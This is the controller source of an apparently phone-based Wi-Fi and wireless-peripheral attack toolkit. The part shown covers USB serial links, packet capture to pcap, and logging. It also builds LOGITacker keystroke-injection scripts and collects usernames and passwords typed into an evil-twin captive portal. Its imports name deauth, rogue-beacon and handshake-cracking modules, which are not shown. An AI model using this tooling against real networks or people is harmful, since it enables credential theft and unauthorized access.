// app.js — controller.
//
// SPIKE SCOPE: prove the USB-OTG serial link to the board and complete a PING
// round-trip against stock firmware. The four-stage flow is laid out but its
// stages are stubs — the real work lands once the link is proven.

import { encodeFrame, encodeCmd, FrameDecoder, payloadJson, TYPE, typeName } from './protocol.js';
import { UsbTransport } from './transport.js';
import { Icon } from './icons.js';
import { CaptureSession } from './capture.js';
import { analyzeChunks, findings, kaputCheck } from './analyze.js';
import { plan, reportText, topTarget } from './analysis.js';
import { attackList, blockedOnTransmit } from './attacks.js';
import { buildDeauth, buildProbeResponse, buildBeaconPool, SECURITY, MOUSEJACK_PAYLOADS } from './attack.js';
import { extractHandshakes, hashFile } from './crack.js';
import { importCapture, describeImport } from './import.js';
import { takeSharedCapture } from './native-import.js';
import { CrackBridge } from './bridge.js';
import {
  PORTAL_ARM_TOKEN, portalArm, rankTwinCandidates, selectTwinTarget,
  twinRejectReason, portalPageChunks, parsePortalSubmission, PORTAL_TEMPLATES,
} from './portal.js';
import './gps.js';    // window.GPS
import './hashstore.js'; // window.HashStore
import './wardrive.js';  // window.Wardrive
import { LogitackerSession, parseDevices, LOGITACKER_COMMANDS, PREBUILT_SCRIPTS, PRESS_KEYS } from './logitacker.js';

const $ = (sel) => document.querySelector(sel);

// ── logging ───────────────────────────────────────────────────────────────────
const logEl = () => $('#log');

function log(kind, text) {
  const el = logEl();
  if (!el) return;
  const t = new Date().toLocaleTimeString([], { hour12: false });
  const line = document.createElement('div');
  const cls = { tx: 'tx', rx: 'rx', err: 'er', ev: 'ev' }[kind] || '';
  line.innerHTML = `<span class="t">${t}</span> <span class="${cls}">${escapeHtml(text)}</span>`;
  el.appendChild(line);
  // This pane is fed by RF chatter, and an element that grows without bound gets
  // slow — a slow reader starves the dongle and makes it drop its own output.
  while (el.childElementCount > 400) el.removeChild(el.firstElementChild);
  el.scrollTop = el.scrollHeight;
}

function escapeHtml(s) {
  return String(s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
}

// ── state ─────────────────────────────────────────────────────────────────────
const state = {
  devices: [],
  deviceInfo: null,   // last PING response
  nextId: 1,
  pending: new Map(), // frame id -> { resolve, reject, timer, label }
  stage: 'capture',
};

// The Capture stage's session. Declared before the decoder because the decoder
// feeds it PCAP frames; assigned once request() exists, further down.
let capture = null;

const transport = new UsbTransport({
  onData: (bytes) => decoder.push(bytes),
  onStatus: (kind, detail) => {
    if (kind === 'connected')   log('ev', `link up: ${detail.driver} (portId ${detail.portId})`);
    if (kind === 'disconnected') log('ev', 'link down');
    if (kind === 'detached')    { log('err', 'device detached'); setConnected(false); }
    if (kind === 'error')       log('err', 'stream error: ' + JSON.stringify(detail));
    setConnected(transport.connected);
  },
});

const decoder = new FrameDecoder({
  onFrame: (f) => {
    // PCAP frames are the payload of a sync, not something to narrate. One line
    // per frame would bury the protocol traffic under hundreds of lines.
    if (f.type === TYPE.PCAP) {
      capture?.onPcapChunk(f.payload);
      return;
    }
    // Wardrive's live stream. One radiotap+frame per message, and it belongs to
    // Wardrive's own analysis — not to the capture writer above, whose chunks
    // are mid-assembly into a pcap artifact.
    if (f.type === TYPE.PCAP_CONT) {
      window.Wardrive?.onSegmentChunk(f.payload);
      return;
    }
    const json = f.type === TYPE.RESP || f.type === TYPE.EVENT ? payloadJson(f.payload) : null;
    if (json === null && (f.type === TYPE.RESP || f.type === TYPE.EVENT)) {
      // A RESP whose payload never parsed is a LOST REPLY, not a refusal by the
      // board — the board may have accepted the command and answered perfectly.
      // Say which one it is: the old single "57B" line cost a day of hunting.
      log('err', `${typeName(f.type)} id=${f.id}: payload did not parse (${f.payload.length}B) — reply lost, not a refusal`);
    }
    log('rx', `${typeName(f.type)} id=${f.id} ${json ? JSON.stringify(json) : f.payload.length + 'B'}`);
    if (f.type === TYPE.EVENT && json) onEvent(json);
    if (f.type === TYPE.RESP && state.pending.has(f.id)) {
      const p = state.pending.get(f.id);
      clearTimeout(p.timer);
      state.pending.delete(f.id);
      p.resolve(json);
    }
  },
  onError: (msg) => log('err', 'decode: ' + msg),
});

// ── dongle lane: nRF52840 + LOGITacker ───────────────────────────────────────
//
// A second, independent transport. The dongle is a TEXT SHELL (LOGITacker), not
// the ESP32's framed protocol, so it gets its own UsbTransport instance and its
// own session. The two never share a port, and the board being unplugged must
// not disable this lane — they are different radios with different jobs.
//
// Everything this lane knows about the shell's grammar lives in logitacker.js and
// is gated by tools/verify_logitacker.mjs against bytes captured off the device.

const dongleTransport = new UsbTransport({
  onData: (bytes) => dongleSession.feed(bytes),
  onStatus: (kind, detail) => {
    if (kind === 'connected')    dlog('link up (' + (detail.driver || 'usb') + ')');
    if (kind === 'disconnected') { dlog('link down'); setDongleState(false); }
    if (kind === 'detached')     { dlog('dongle detached'); setDongleState(false); }
    if (kind === 'error')        dlog('stream error: ' + JSON.stringify(detail));
  },
});

const dongleSession = new LogitackerSession({
  send: (bytes) => dongleTransport.send(bytes),
  onMode: (m) => setDongleState(true, m),
  // The shell prints state asynchronously as <info> lines. They are not replies and
  // must never be mistaken for one — see verify_logitacker.mjs. They go to Trace
  // only: the hopper repeats "no RX … restart channel hopping" every ~500 ms, which
  // buries the command output this card exists to show.
  onEvent: (e) => log('ev', 'dongle: ' + e),
});

// The WebView helper (tools/webview_eval.mjs) drives this app over CDP, so reaching
// the dongle lane from the console is what makes on-device testing possible at all.
// Without it the only thing visible is the parser's *interpretation* of the shell,
// which is exactly what you cannot trust when the parser is the suspect.
window.__dongle = { get session() { return dongleSession; }, get transport() { return dongleTransport; } };

// The same trick for the import lane, which is otherwise only reachable through the
// native file picker — a dialog no test can click and no screenshot can script. Feeding
// a capture in through the one importer the UI uses (onImportPickBytes) means a
// documentation capture exercises the real path: parse, analyze, plan, repaint.
//
// It takes base64 because that is what crosses the CDP boundary cleanly, and it is the
// same shape the native share plugin already hands us.
window.__importBytes = async (b64, name = 'demo-capture.pcap') => {
  const { b64ToBytes } = await import('./native-import.js');
  await onImportPickBytes(b64ToBytes(b64), name);
  return `imported ${name}`;
};


function dlog(text) {
  log('ev', 'dongle: ' + text);
  const el = $('#dongleOut');
  if (!el) return;
  const t = new Date().toLocaleTimeString([], { hour12: false });
  el.textContent += `${t}  ${text}\n`;
  const kept = el.textContent.split('\n');
  if (kept.length > 300) el.textContent = kept.slice(-300).join('\n');
  el.scrollTop = el.scrollHeight;
}

let lastScriptPick = null;

/** Send a whole script, one command at a time, showing each step as it lands.
 *  The shell APPENDS to the current script, so every prebuilt one starts with
 *  `script clear` — otherwise you inherit whatever was left from last time. */
async function buildScript(s) {
  lastScriptPick = s.id;
  const text = $('#mjScriptText').value.trim();
  if (s.steps.some((x) => x.includes('{text}')) && !text) {
    dlog(`"${s.name}" types text — put it in the box above first.`);
    return;
  }
  const cmds = s.steps.map((step) => step
    .replace(/\{text\|([^}]*)\}/g, (_, d) => text || d)
    .replace(/\{text\}/g, text));
  dlog(`building "${s.name}" — ${cmds.length} steps`);
  for (const cmd of cmds) {
    // Most script commands answer NOTHING — the append is silent. Waiting the full
    // timeout for each one makes a long script crawl, and reporting the silence as
    // a failure is a lie. Send, listen briefly, move on: the read-back below is
    // what actually proves the script got built.
    const r = await dongleSession.run(cmd, { timeoutMs: 1200 });
    if (r.timedOut) dlog(`> ${cmd}`);
    else dlog(`> ${cmd}\n${(r.body || '').trim()}`);
  }
  const shown = await dongleSession.scriptShow({ timeoutMs: 8000 });
  const readBack = (shown.body || '').trim();
  dlog('the script on the dongle now reads:\n' + (readBack || '(no answer — the shell was too busy; try Show script)'));
  // Verify instead of assuming: count the steps the shell printed back against the
  // ones we sent. `script clear` wipes, so only what follows the LAST one counts.
  const built = (readBack.match(/^\s*\d{4}:/gm) || []).length;
  const expected = cmds.slice(cmds.lastIndexOf('script clear') + 1).length;
  dlog(built === expected
    ? `built — ${built} step(s) on the dongle`
    : `the dongle reports ${built} step(s), expected ${expected}`);
  dlog('to fire it: pick "inject target <address>" above, then "inject execute"');
}

function setDongleState(on, mode) {
  const el = $('#dongleStatus');
  if (el) el.textContent = on ? `linked · ${mode || 'ready'}` : 'not connected';
}

/** LOGITacker enumerates as Nordic 1915:520c and names itself; the plugin does
 *  not always surface VID/PID, so match on the name as well. */
function isDongle(d) {
  const name = String(d.deviceName || '');
  return /logitacker|nordic/i.test(name)
      || d.vendorId === 0x1915 || d.vendorId === '0x1915' || d.productId === 0x520c;
}

/** Re-entrancy guard: the auto-link calls onPickDongle, which refreshes by scanning. */
let dongleLinking = false;

/** Is the dongle card linked? The status line is the one place that knows. */
function dongleLinked() {
  const st = ($('#dongleStatus')?.textContent || '').trim();
  return !!st && st !== 'not connected';
}

/**
 * Find USB serial devices, and LINK the dongle when there is nothing to decide.
 *
 * There used to be a second step here — tap the dongle row — that existed even when
 * the dongle was the only candidate on the bus. Nothing said so: the guard below
 * answered into a log line under the fold, which reads as a dead button — exactly what
 * three taps in a row on that screen produced.
 *
 * `autoLink:false` is for the refresh inside onPickDongle, which would otherwise
 * call itself.
 */
async function dongleScan({ autoLink = true } = {}) {
  try {
    state.dongleDevices = await dongleTransport.listDevices();
    // Put the dongle first — it is the only device this card can use.
    state.dongleDevices.sort((x, y) => isDongle(y) - isDongle(x));
    renderDongleDevices();
    // One candidate is not a choice. Link it rather than asking for a row tap.
    const dongles = (state.dongleDevices || []).filter(isDongle);
    if (autoLink && !dongleLinking && !dongleLinked() && dongles.length === 1) {
      dlog('one dongle on the bus — linking it');
      await onPickDongle(dongles[0]);
    }
    return state.dongleDevices;
  } catch (e) {
    dlog('scan failed: ' + e.message);
    return [];
  }
}

function renderDongleDevices() {
  const box = $('#dongleDevices');
  if (!box) return;
  const list = state.dongleDevices || [];
  if (!list.length) {
    box.innerHTML = `<div class="empty">${Icon('unlink', { size: 30 })}No USB serial device found.<br>Plug the nRF52840 dongle into the phone.</div>`;
    return;
  }
  box.innerHTML = list.map((d) => `
    <div class="device" data-dongle-id="${escapeHtml(String(d.deviceId))}">
      ${Icon('plug', { size: 20 })}
      <div class="meta">
        <div class="name">${escapeHtml(d.deviceName || 'USB serial device')}${isDongle(d) ? ' — dongle' : ''}</div>
        <div class="sub">${escapeHtml(d.driverType || 'unknown driver')} · ${d.hasPermission ? 'permission granted' : 'needs permission'}</div>
      </div>
      ${Icon('chevron', { size: 18 })}
    </div>`).join('');
  box.querySelectorAll('.device').forEach((el) => {
    el.addEventListener('click', () => {
      const dev = list.find((d) => String(d.deviceId) === el.dataset.dongleId);
      if (dev) onPickDongle(dev);
    });
  });
}

async function onPickDongle(dev) {
  dongleLinking = true;
  try {
    dlog(`opening ${dev.deviceName || dev.deviceId}…`);
    await dongleTransport.connect(dev);
    // Sync: send a bare newline and wait for the prompt. Anything already in the
    // buffer is unattributable, and guessing at it shifts every later reply.
    const r = await dongleSession.ready();
    if (!r.ok) {
      // Not fatal: the port is open, and the dongle may be talking already. Ask it
      // something rather than walking away from a link that demonstrably works.
      dlog(`no prompt within ${Math.round(dongleSession.syncTimeoutMs / 1000)}s — if events appear below the link is live anyway; asking devices`);
    } else {
      dlog(`shell ready (${r.mode || '?'} mode)${r.attempts > 1 ? ` after ${r.attempts} tries` : ''}`);
    }
    dongleScan({ autoLink: false });   // refresh: the row should stop claiming it needs permission
    await dongleDevices();
  } catch (e) {
    dlog('connect failed: ' + e.message);
    setDongleState(false);
  } finally {
    dongleLinking = false;
  }
}

async function dongleRun(cmd) {
  const r = await dongleSession.run(cmd);
  if (r.timedOut)          dlog(`> ${cmd}\nno reply within ${dongleSession.timeoutMs}ms`);
  else if (r.notFound)     dlog(`> ${cmd}\n"${cmd.split(' ')[0]}" is not a command this shell has`);
  else                     dlog(`> ${cmd}\n${r.body || '(no output)'}`);
  // Asking for the device list by hand is still asking for the device list: render
  // it, so the table does not stay empty just because the command came from the box
  // rather than the button.
  if (!r.timedOut && /^devices\b/i.test(r.cmd || '')) renderDongleTable(parseDevices(r.body));
  return r;
}

/** The first question worth asking a MouseJack radio: what can it hear? */
async function dongleDevices() {
  const r = await dongleSession.devices();
  if (r.timedOut) { dlog('devices: no reply'); return; }
  renderDongleTable(r.devices);
  if (!r.devices.length) {
    renderDongleTable([], 'Nothing heard yet — the dongle keeps listening. Tap again in a moment.');
    dlog('no devices seen yet (it keeps scanning — try again in a moment)');
  }
  else for (const d of r.devices) dlog(`${d.addr}  ${d.kind}${d.encrypted ? ' · encrypted' : ''}`);
}

function renderDongleTable(list, emptyMsg) {
  const box = $('#dongleTable');
  if (!box) return;
  if (!list || !list.length) {
    box.innerHTML = emptyMsg
      ? `<div class="empty">${Icon('scan', { size: 30 })}${escapeHtml(emptyMsg)}</div>`
      : '';
    return;
  }
  box.innerHTML = list.map((d) => `
    <div class="device">
      ${Icon('plug', { size: 20 })}
      <div class="meta">
        <div class="name">${escapeHtml(d.addr)} · ${escapeHtml(d.kind)}</div>
        <div class="sub">${escapeHtml(d.cls || 'unclassified')}${d.encrypted ? ' · link encrypted' : ''} · WPID ${escapeHtml(String(d.wpid || '?'))}</div>
      </div>
    </div>`).join('');
}

// ── request/response ──────────────────────────────────────────────────────────
function request(cmd, args, { timeoutMs = 4000 } = {}) {
  return new Promise((resolve, reject) => {
    const id = state.nextId++ & 0xff;
    const frame = encodeCmd(id, cmd, args);
    log('tx', `${cmd} id=${id}${args ? ' ' + JSON.stringify(args) : ''}`);
    const timer = setTimeout(() => {
      state.pending.delete(id);
      reject(new Error(`${cmd} timed out after ${timeoutMs}ms`));
    }, timeoutMs);
    state.pending.set(id, { resolve, reject, timer, label: cmd });
    transport.send(frame).catch((e) => {
      clearTimeout(timer);
      state.pending.delete(id);
      reject(e);
    });
  });
}

/** Which attack row is open (its id), or null. Kept at module scope so a repaint
 *  — and every state change repaints — does not slam the row you were reading. */
let openAttackId = null;

// ── capture session ───────────────────────────────────────────────────────────
capture = new CaptureSession({
  request,
  log,
  onProgress: () => { if (state.stage === 'capture') renderCaptureStats(); },
});

// ── ui ────────────────────────────────────────────────────────────────────────
function setConnected(on) {
  const pill = $('#connPill');
  if (pill) {
    pill.className = 'pill ' + (on ? 'on' : '');
    pill.innerHTML = `<span class="dot"></span>${on ? 'linked' : 'offline'}`;
  }
  const link = $('#linkBtn');
  if (link) link.classList.toggle('hidden', !on);
  $('#connectCard')?.classList.toggle('hidden', on);
  $('#consoleCard')?.classList.toggle('hidden', !on);

  // If disconnected while wardriving, stop the session
  if (!on && window.Wardrive && window.Wardrive.isRunning()) {
    window.Wardrive.stop();
  }
  // Hide wardrive card when offline
  if (!on) toggleWardriveMode(false);
}

function renderDevices() {
  const box = $('#deviceList');
  if (!box) return;
  if (!state.devices.length) {
    box.innerHTML = `<div class="empty">${Icon('unlink', { size: 30 })}No USB serial device found.<br>Plug the board into the phone.</div>`;
    return;
  }
  box.innerHTML = state.devices.map((d) => `
    <div class="device" data-device-id="${escapeHtml(String(d.deviceId))}">
      ${Icon('plug', { size: 20 })}
      <div class="meta">
        <div class="name">${escapeHtml(d.deviceName || 'USB serial device')}</div>
        <div class="sub">${escapeHtml(d.driverType || 'unknown driver')} · ${d.hasPermission ? 'permission granted' : 'needs permission'}</div>
      </div>
      ${Icon('chevron', { size: 18 })}
    </div>`).join('');

  box.querySelectorAll('.device').forEach((el) => {
    el.addEventListener('click', () => {
      const id = el.dataset.deviceId;
      const dev = state.devices.find((d) => String(d.deviceId) === id);
      if (dev) onPickDevice(dev);
    });
  });
}

async function refreshDevices() {
  try {
    state.devices = await transport.listDevices();
    log('ev', `found ${state.devices.length} device(s)`);
    renderDevices();
  } catch (e) {
    log('err', 'listDevices failed: ' + e.message);
    $('#deviceList').innerHTML =
      `<div class="empty">${Icon('alert', { size: 30 })}${escapeHtml(e.message)}</div>`;
  }
}

async function onPickDevice(dev) {
  try {
    log('ev', `opening ${dev.deviceName || dev.deviceId}…`);
    await transport.connect(dev);
    setConnected(true);
    // First thing on every link: prove the device is actually talking.
    await ping();
  } catch (e) {
    log('err', 'connect failed: ' + e.message);
  }
}

async function ping() {
  try {
    const resp = await request('PING');
    if (resp && resp.ok) {
      state.deviceInfo = resp;
      log('ev', `PING ok — transport=${resp.transport}`);
      renderDeviceInfo(resp);
    } else {
      log('err', 'PING returned ' + JSON.stringify(resp));
    }
  } catch (e) {
    log('err', e.message);
  }
}

function renderDeviceInfo(info) {
  const box = $('#deviceInfo');
  if (!box) return;
  box.innerHTML = `
    <dl class="kv">
      <dt>transport</dt><dd>${escapeHtml(info.transport || '—')}</dd>
      <dt>driver</dt><dd>${escapeHtml(transport.deviceId != null ? 'USB-OTG serial' : '—')}</dd>
    </dl>`;
}

// ── views ─────────────────────────────────────────────────────────────────────
//
// Capture and Analysis each hold a set of views instead of a numbered flow. The
// difference matters: a step numbered a position in one path and moving along it
// was the point, so tapping a step was a small event. A view is just what you are
// looking at, and switching views does exactly one thing — it changes what is on
// screen. Nothing starts because a view was opened.

/** Draw Capture's switcher. Rebuilt on every repaint, so the lit view is always
 *  the one actually on screen rather than the last one tapped. */
function renderCaptureViews() {
  const box = $('#captureViews');
  if (!box) return;
  box.innerHTML = CAPTURE_VIEWS.map((v) => `
    <button class="viewtab ${captureView === v.id ? 'active' : ''}" data-capture-view="${v.id}"
            aria-pressed="${captureView === v.id}">
      ${Icon(v.icon, { size: 16 })}<span>${v.label}</span>
    </button>`).join('');
}

/** Draw Analysis' switcher. Two views over one subject — the labels are new, the
 *  modules and data behind them are not. */
function renderAnalysisViews() {
  const box = $('#analysisViews');
  if (!box) return;
  box.innerHTML = ANALYSIS_VIEWS.map((v) => `
    <button class="viewtab ${analysisView === v.id ? 'active' : ''}" data-analysis-view="${v.id}"
            aria-pressed="${analysisView === v.id}">
      ${Icon(v.icon, { size: 16 })}<span>${v.label}</span>
    </button>`).join('');
}

/** Which of Capture's three cards is on screen. The two console mirrors are
 *  connection-gated first (the observer in index.html), so the rule here is
 *  view + connection, in that order — and this is the only thing that decides
 *  it, so the observer and this function cannot fight over the same class. */
function applyCaptureView() {
  renderCaptureViews();
  const card = document.getElementById('consoleCard');
  const connected = !!card && !card.classList.contains('hidden');
  document.getElementById('analyzerCard')?.classList.toggle('hidden', captureView !== 'channels');
  document.getElementById('consoleCard3')?.classList.toggle('hidden', captureView !== 'packets' || !connected);
  document.getElementById('captureOffline')?.classList.toggle('hidden', connected || captureView !== 'packets');
  document.getElementById('wardriveCard')?.classList.toggle('hidden', captureView !== 'wardrive');
  // View and mode are the same thing now: while the Wardrive view is open the
  // session is a wardrive session, which is what silences the bridge keepalive.
  wardriveModeOn = captureView === 'wardrive';
  labelWardriveBtn();
}
// The console-card observer in index.html re-asserts this after it mirrors the
// connection state, so a view switch and a connect/disconnect cannot disagree.
window.applyCaptureView = applyCaptureView;

/** Open a Capture view. Guarded by the list, and it starts nothing. */
function setCaptureView(id) {
  if (!CAPTURE_VIEWS.some((v) => v.id === id)) return;
  captureView = id;
  applyCaptureView();
}

/** Paint whichever Analysis view is open. Only the open one: both write their
 *  whole box, so painting the other would wipe the one being read. */
function renderAnalysisHost() {
  const box = $('#analysisPanel');
  if (!box) return;
  if (analysisView === 'assessment') renderAnalysisPanel(box);
  else renderAnalyzePanel(box);
}

function applyAnalysisView() {
  renderAnalysisViews();
  renderAnalysisHost();
}

function setAnalysisView(id) {
  if (!ANALYSIS_VIEWS.some((v) => v.id === id)) return;
  analysisView = id;
  applyAnalysisView();
}

// ── events from the device ────────────────────────────────────────────────────
function onEvent(json) {
  if (json.event === 'capture_done') {
    capture.onCaptureDone(json);
    stopCapTicker();
    log('ev', `capture finished on its own: ${json.frames ?? '?'} frames, ${json.dropped ?? '?'} dropped`);
    // If this was the listening half of a burst, auto-sync and auto-extract.
    //
    // Deliberately NOT gated on state.stage. That gate read 'attack', a value
    // nothing has written since Attack became its own tab — renderStagePanel()
    // resets it to 'capture' and nothing sets it back — so the branch was
    // unreachable and the burst's second half was never collected. The visible
    // symptom was exactly the one it caused: the burst fires, the radio hears
    // the rejoin, the capture completes, and the app never reads it back, so
    // Crack reports nothing. The flag below is the state this needs, and it is
    // owned by the only code that can know: the code that started the capture.
    if (awaitingBurstCapture) {
      awaitingBurstCapture = false;
      syncAfterBurst();
    }
    refreshPanels();
    return;
  }
  if (json.event === 'portal_submission') {
    // The radio hands over what somebody typed into the twin's page. It is held
    // in memory on this phone only — the firmware never writes it to flash, and
    // the panel's clear button is the only thing that drops it.
    portalSubs.push({
      user: String(json.user ?? ''),
      pass: String(json.pass ?? ''),
      ip: String(json.ip ?? ''),
      blank: !!json.blank,
      ms: Number(json.ms ?? 0),
      at: Date.now(),
    });
    log('ev', `portal: a submission arrived from ${json.ip || 'a client'}`);
    // paintPortal, not renderStagePanel: a full re-render would wipe the page
    // textarea out from under an operator editing it when this lands.
    //
    // Unconditional, like the burst's capture_done above. This used to read
    // `state.stage === 'attack'`, which was dead for the same reason: nothing
    // writes that value any more. A submission arriving while the operator was
    // watching the portal therefore landed in `portalSubs` and was never drawn —
    // the panel only caught up on the next unrelated repaint. paintPortal()
    // already guards on #portalLive and #portalSubsBox existing, so calling it
    // when the portal card is not on screen is a no-op, not a crash.
    paintPortal();
    return;
  }
  // 'stage' and 'hb' describe the DEVICE's radio state. state.stage is the
  // operator's position, and with the step bar gone that is only ever the Capture
  // panel's packets view. Related, but not the same thing — so one never moves the
  // other. A board that says "idle" is not the operator leaving the view.
}

// ── capture panel ─────────────────────────────────────────────────────────────
const CHANNELS = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13];
const DURATIONS = [
  { v: 5000,  label: '5 s' },
  { v: 10000, label: '10 s' },
  { v: 30000, label: '30 s' },
  { v: 60000, label: '60 s' },
];

let capTicker = null;
function stopCapTicker() {
  if (capTicker) { clearInterval(capTicker); capTicker = null; }
}
// Poll the board while it sniffs. The capture runs for seconds with nothing
// else to look at, and a live frame count is the difference between "working"
// and "hung" — the link is proven, so it is a cheap question to keep asking.
function startCapTicker() {
  stopCapTicker();
  capTicker = setInterval(async () => {
    if (!capture.running) { stopCapTicker(); return; }
    try {
      const s = await request('CAPTURE_STATS', undefined, { timeoutMs: 3000 });
      if (s && s.ok) { capture.stats = s; renderCaptureStats(); }
    } catch { /* link busy this tick — the next one will try again */ }
  }, 1000);
}

function fmtBytes(n) {
  if (n == null) return '—';
  if (n < 1024) return n + ' B';
  if (n < 1048576) return (n / 1024).toFixed(1) + ' KB';
  return (n / 1048576).toFixed(2) + ' MB';
}

/** The Capture page's Packets view: the sniffing controls and the buffer.
 *
 *  `state.stage` used to name the operator's position in the four-step bar. The
 *  bar is gone, so this panel can only be asked for one thing, and anything else
 *  left in `state.stage` — legacy session state, or the 'attack' value that has
 *  been dead since Attack became its own tab — is reset rather than rendering an
 *  empty box. There is deliberately no 'attack' branch: this guard would have
 *  reset the value first, so it would only ever look like working code. */
function renderStagePanel() {
  const box = $('#stagePanel');
  if (!box) return;
  if (state.stage !== 'capture') state.stage = 'capture';
  renderCapturePanel(box);
}

function renderCapturePanel(box) {
  const running = capture.running;
  box.innerHTML = `
    <div class="stagehead">
      ${Icon('capture', { size: 22 })}
      <div>
        <div class="stagename">Capture</div>
        <div class="stagesub">802.11 frames into the board's PSRAM, then synced down to a pcap on this phone.</div>
      </div>
    </div>

    <div class="fields">
      <label class="field">
        <span>Channel</span>
        <select id="capChannel" ${running ? 'disabled' : ''}>
          ${CHANNELS.map((c) => `<option value="${c}"${c === capture.channel ? ' selected' : ''}>${c}</option>`).join('')}
        </select>
      </label>
      <label class="field">
        <span>Duration</span>
        <select id="capDuration" ${running ? 'disabled' : ''}>
          ${DURATIONS.map((d) => `<option value="${d.v}"${d.v === capture.durationMs ? ' selected' : ''}>${d.label}</option>`).join('')}
        </select>
      </label>
    </div>

    <div class="row">
      <button id="capStart" class="primary ${running || capture.continuousRunning ? 'hidden' : ''}">${Icon('capture', { size: 18 })}Start capture</button>
      <button id="capStop" class="danger ${running && !capture.continuousRunning ? '' : 'hidden'}">${Icon('stop', { size: 18 })}Stop</button>
    </div>

    <div id="capContinuousRow" class="row ${capture.continuousRunning ? '' : 'hidden'}" style="margin-top:4px">
      <button id="capContStop" class="danger">${Icon('stop', { size: 18 })}Stop continuous</button>
    </div>

    <div id="capContinuousStatus" class="${capture.continuousRunning ? '' : 'hidden'}" style="margin-top:8px">
      <dl class="kv">
        <dt>continuous</dt><dd id="contSegments">${capture.continuousSegments} segments</dd>
        <dt>total frames</dt><dd id="contFrames">${capture.continuousPackets}</dd>
        <dt>elapsed</dt><dd id="contElapsed">0s</dd>
      </dl>
    </div>

    <div id="capStats"></div>

    <div class="row" style="margin-top:10px">
      <button id="capSync" class="ghost" ${running || !capture.stats || capture.continuousRunning ? 'disabled' : ''}>${Icon('refresh', { size: 18 })}Sync to phone</button>
      <button id="capSave" class="ghost" ${capture.hasData && !capture.continuousRunning ? '' : 'disabled'}>${Icon('save', { size: 18 })}Save pcap</button>
    </div>

    <button id="capContStart" class="ghost" style="margin-top:6px;width:100%;font-size:12px" ${running || capture.continuousRunning ? 'disabled' : ''}>
      ${Icon('play', { size: 14 })}Continuous — auto-stitch multiple buffers into one pcap
    </button>

    ${capture.saved ? `<div class="saved">${Icon('check', { size: 16 })}
      <span>${escapeHtml(capture.saved.path)} · ${fmtBytes(capture.saved.bytes)}</span></div>` : ''}
  `;

  $('#capChannel')?.addEventListener('change', (e) => { capture.channel = Number(e.target.value); });
  $('#capDuration')?.addEventListener('change', (e) => { capture.durationMs = Number(e.target.value); });
  $('#capStart')?.addEventListener('click', onCaptureStart);
  $('#capStop')?.addEventListener('click', onCaptureStop);
  $('#capSync')?.addEventListener('click', onCaptureSync);
  $('#capSave')?.addEventListener('click', onCaptureSave);
  $('#capContStart')?.addEventListener('click', onCaptureContStart);
  $('#capContStop')?.addEventListener('click', onCaptureContStop);

  renderCaptureStats();
}

function renderCaptureStats() {
  const el = $('#capStats');
  if (!el) return;
  const s = capture.summary();
  const dev = capture.stats;
  const rows = [];

  if (dev) {
    rows.push(['board frames', dev.frames ?? '—']);
    rows.push(['board dropped', dev.dropped ?? '—']);
    rows.push(['board bytes', fmtBytes(dev.bytes)]);
  }
  if (s.packets) {
    rows.push(['file packets', s.packets]);
    rows.push(['file size', fmtBytes(s.bytes)]);
    if (s.spanMs != null) rows.push(['timeline', s.spanMs.toFixed(0) + ' ms']);
    // Say which timestamps you actually got. A pcap whose records all carry the
    // phone's arrival time is not wrong, but it cannot be trusted to order
    // events — and that difference is invisible in the file.
    rows.push(['timestamps', s.untimed === 0
      ? `TSFT (${s.timed})`
      : `${s.timed} TSFT / ${s.untimed} arrival`]);
  }

  el.innerHTML = rows.length
    // Every value here is either a number formatted by fmtBytes or a string
    // passed through escapeHtml — nothing reaches the DOM raw.
    ? `<dl class="kv">${rows.map(([k, v]) => `<dt>${k}</dt><dd>${escapeHtml(String(v))}</dd>`).join('')}</dl>`
    : '';
}

async function onCaptureStart() {
  try {
    const resp = await capture.start({ channel: capture.channel, durationMs: capture.durationMs });
    log('ev', `capture started ch${resp.channel} for ${resp.duration_ms} ms, buffer ${fmtBytes(resp.buf_bytes)}`);
    refreshPanels();
    startCapTicker();
  } catch (e) {
    log('err', 'capture start: ' + e.message);
  }
}

async function onCaptureStop() {
  stopCapTicker();
  try {
    const resp = await capture.stop();
    log('ev', `capture stopped: ${resp?.frames ?? '?'} frames, ${resp?.dropped ?? '?'} dropped`);
  } catch (e) {
    log('err', 'capture stop: ' + e.message);
  }
  refreshPanels();
}

async function onCaptureSync() {
  const btn = $('#capSync');
  if (btn) { btn.disabled = true; btn.textContent = 'Syncing…'; }
  try {
    await capture.sync();
    const s = capture.summary();
    log('ev', `synced ${s.packets} packets, ${fmtBytes(s.bytes)}, span ${s.spanMs == null ? '—' : s.spanMs.toFixed(0) + ' ms'}`);
  } catch (e) {
    log('err', 'sync: ' + e.message);
  }
  refreshPanels();
}

async function onCaptureSave() {
  try {
    const saved = await capture.save();
    log('ev', `saved ${saved.path} (${fmtBytes(saved.bytes)}, ${saved.packets} packets)`);
    refreshPanels();
  } catch (e) {
    log('err', 'save: ' + e.message);
  }
}

// ── continuous capture ─────────────────────────────────────────────

let contTicker = null;

function startContTicker() {
  stopContTicker();
  contTicker = setInterval(() => {
    if (!capture.continuousRunning) { stopContTicker(); return; }
    const segEl = document.getElementById('contSegments');
    const frmEl = document.getElementById('contFrames');
    const elEl = document.getElementById('contElapsed');
    if (segEl) segEl.textContent = capture.continuousSegments + ' segments';
    if (frmEl) frmEl.textContent = String(capture.writer?.packets ?? 0);
    if (elEl) {
      const secs = Math.floor((Date.now() - (capture.continuousStartWallMs ?? Date.now())) / 1000);
      elEl.textContent = secs + 's';
    }
  }, 1000);
}

function stopContTicker() {
  if (contTicker) { clearInterval(contTicker); contTicker = null; }
}

async function onCaptureContStart() {
  try {
    const ch = (document.getElementById('capChannel')?.value) || capture.channel;
    const durMs = (document.getElementById('capDuration')?.value) || capture.durationMs;
    const resp = await capture.startContinuous({
      channel: Number(ch),
      durationMs: Number(durMs),
    });
    log('ev', `continuous: started ch${resp.channel}, ${resp.duration_ms} ms segments`);
    refreshPanels();
    startContTicker();
  } catch (e) {
    log('err', 'continuous start: ' + e.message);
  }
}

async function onCaptureContStop() {
  stopContTicker();
  const btn = document.getElementById('capContStop');
  if (btn) { btn.disabled = true; btn.textContent = 'Stopping…'; }
  try {
    const saved = await capture.stopContinuous();
    if (saved) {
      log('ev', `continuous: saved ${saved.path} (${fmtBytes(saved.bytes)}, ${saved.packets} packets)`);
    } else {
      log('ev', 'continuous: stopped (no data captured)');
    }
  } catch (e) {
    log('err', 'continuous stop: ' + e.message);
  }
  refreshPanels();
}

